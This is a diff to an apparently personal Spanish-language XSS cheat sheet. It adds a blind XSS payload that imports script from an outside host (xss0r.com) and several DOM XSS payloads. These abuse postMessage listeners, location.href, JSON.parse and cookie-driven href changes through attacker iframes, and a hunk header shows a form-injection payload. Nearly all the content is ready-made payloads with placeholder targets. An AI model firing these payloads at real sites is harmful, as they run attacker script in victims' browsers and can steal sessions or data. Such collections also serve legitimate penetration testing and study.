@@ -1,7 +1,9 @@
 -- -
+## **bXSS**
+```html
+<img/src/onerror=import('https://xss0r.com/c/vacasa');//>
+```
 
-## **Reconocimiento**  
-- Siempre empezar probando con html injection.
 
 ---
 
@@ -132,6 +134,27 @@ my-account?email=prueba"></form><form class="login_form" name="myform" action="h
 **Aprovechando insercion en el content CSP**
 ```html
 script-src-elem 'unsafe-inline'
+```
+
+### **DOM XSS**
+**Aprovechando `window.addEventListener` y `Postmessage`**
+```html
+<iframe width=600px height=600px src="https://URL/" onload='this.contentWindow.postMessage("<img src=x onerror=alert(0)","*")'></iframe>
+```
+
+*Abusando de  location.href*
+```html
+<iframe width=600px height=600px src="https://URL/" onload='this.contentWindow.postMessage("javascript:alert(0)//https://kike.com","*")'></iframe>
+```
+
+*Abusando de json.parse*
+```html
+<iframe width=600px height=600px src="https://URL/" onload='this.contentWindow.postMessage("{\"type\": \"load-channel\", \"url\": \"javascript:alert(0)\"}","*")'></iframe>
+```
+
+*Manipulando cookies y alterando el href*
+```html
+<iframe src="https://URL/product?productId=3&'><script>alert(0)</script>" onload="if(!window.x)this.src='https://URL';window.x=1;"></iframe>
 ```
 
 ---
